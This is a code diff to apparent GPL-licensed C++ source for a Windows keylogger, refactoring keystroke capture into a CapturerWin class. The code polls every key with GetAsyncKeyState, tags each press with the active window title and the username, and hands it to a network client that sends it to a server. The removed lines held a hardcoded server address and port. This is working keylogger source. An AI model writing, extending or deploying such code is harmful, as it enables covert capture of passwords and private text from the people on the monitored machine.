@@ -20,50 +20,30 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#define SERVER_ADDRESS "localhost"
-#define SERVER_PORT "1995"
 
 #include "common.hpp"
 #include "MindClient.h"
+#include "CapturerWin.h"
 
 #include <cstdlib>
 #include <windows.h>
 
-
-std::string GeyKey(unsigned char c);
-std::string intToString(unsigned short);
-std::string getCurrDir();
-std::string getSelfPath();
-std::string dirBasename(std::string);
-
-void ServerRunThread(boost::asio::io_service* io_service, Client* clt)
+CapturerWin::CapturerWin(Client* client)
 {
-    try
-    {
-        clt->StartSendOperations();
-        io_service->run();
-    }
-    catch (std::exception& e)
-    {
-        std::cerr << e.what() << std::endl;
-        exit(1);
-    }
-}
+    _client = client;
 
-int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance, LPSTR cmdline, int ncmdshow)
-{
-    boost::asio::io_service io_service;
-    Client* client = new Client(io_service, SERVER_ADDRESS, SERVER_PORT);
-    std::thread senderThread(&ServerRunThread, &io_service, client);
-
+    // Setting up the username.
     char username[0xFF];
     DWORD len = 0xFF;
     GetUserName(username, &len);
 
+    _user = username;
+}
+
+void CapturerWin::run()
+{
     while (1)
     {
-        std::this_thread::sleep_for(std::chrono::milliseconds(2)); // enough for human
-
         // get the active windowtitle
         char title[1024];
         HWND hwndHandle = GetForegroundWindow();
@@ -74,26 +54,22 @@ int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance, LPSTR cmdline
             SHORT rv = GetAsyncKeyState(c);
 
             if (rv & 1) // on press button down
-            { 
+            {
                 // Create the data to be sent to server.
                 KeyDataStruct keyData;
-                keyData.User = username;
+                keyData.User = _user;
                 keyData.WindowTitle = (strlen(title) == 0 ? "NO ACTIVE WINDOW" : title);
                 keyData.Key = GeyKey(c);
-                client->AddKeyInfo(keyData);
+                _client->AddKeyInfo(keyData);
 
                 //std::cout << ">" << GeyKey(c) << "< (" << (unsigned)c << ")" << std::endl;
             }
         }
+        std::this_thread::sleep_for(std::chrono::milliseconds(2)); // enough for human
     }
-
-    senderThread.join();
-    delete client;
-
-    return 0;
 }
 
-std::string GeyKey(unsigned char c)
+std::string CapturerWin::GeyKey(unsigned char c)
 {
     std::string key;
 
@@ -226,7 +202,7 @@ std::string GeyKey(unsigned char c)
     return key;
 }
 
-std::string intToString(unsigned short i)
+std::string CapturerWin::intToString(unsigned short i)
 {
     std::string str = boost::lexical_cast<std::string>(i);
 
